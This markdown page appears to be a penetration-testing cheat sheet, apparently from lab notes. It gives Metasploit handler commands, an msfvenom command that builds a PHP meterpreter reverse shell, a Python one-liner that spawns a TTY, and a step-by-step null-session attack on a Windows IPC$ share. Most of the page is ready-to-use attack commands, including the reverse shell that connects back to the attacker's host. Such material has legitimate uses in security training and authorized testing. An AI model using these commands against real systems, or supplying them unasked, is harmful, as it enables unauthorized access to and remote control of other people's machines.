## Metasploit
#### ./ Handlers

```bash 
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD <Payload name>
msf6 > set LHOST <LHOST value>
msf6 > set LPORT <LPORT value>
msf6 > set ExitOnSession false
msf6 > exploit -j -z
```
<br/>
Once the required values are completed the following command will execute your handler: â€˜msfconsole -L -r' 
<br/>
<br/>

#### ./ Scripting Payloads
PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> lport=<your-port-address> -o shell.php
```

<br/>

## Python
#### ./ Spawn a terminal

```python
python -c 'import pty;pty.spawn("/bin/bash")';
```

  <summary> <b>Checking for Null Sessions</b> </summary>

To verify that, we will exploit the IPC$ administrative share by trying to connect to it without valid credentials.

To connect, you have to type the following command in a Windows shell:

```bash
> NET USE \\<target IP address>\IPC$ '' /u:''
```

This tells Windows to connect to the IPC$ share by using an empty password and an empty username!

Let's try the command on our target:

<br/>
<img src="/assets/images/pts_labs/null_sessions/checking11.png" height="50%" width="50%">
<br/>


The previous command establishes a connection to the IPC$ administrative share without specifying a user; this is possible because our target host is vulnerable to null session attacks. This test only works with the IPC$. For example, it does not work with C$:
  
Example:
<br/>
<img src="/assets/images/pts_labs/null_sessions/checking12.png" height="60%" width="60%">
<br/>
You can also perform the very same checks by using smbclient:
<br/>
<img src="/assets/images/pts_labs/null_sessions/checking13.png" height="70%" width="70%">
